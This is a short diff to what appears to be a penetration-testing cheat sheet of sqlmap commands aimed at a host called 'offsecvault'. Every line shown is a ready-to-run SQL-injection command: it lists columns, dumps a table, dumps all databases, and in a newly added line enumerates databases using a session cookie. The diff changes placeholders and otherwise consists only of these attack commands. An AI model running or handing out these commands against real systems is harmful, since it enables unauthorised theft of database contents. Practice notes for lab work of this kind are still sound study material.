@@ -90,15 +90,19 @@ sqlmap automate
 
 ::: find columns
 
-# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D <database> -T <table> --columns --batch
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D [databasename] -T <table> --columns --batch
 
 ::: dump the table
 
-# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D <database> -T <table> --dump --batch
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D [databasename] -T <table> --dump --batch
 
 ::: dump database
 
-# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D <database> --dump-all --batch
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" -D [databasename] --dump-all --batch
+
+::: database cookie attempt
+
+# sqlmap -u "http://offsecvault/log4j.php?log4j=1" --cookie="value" --dbs
 
 flags:
 
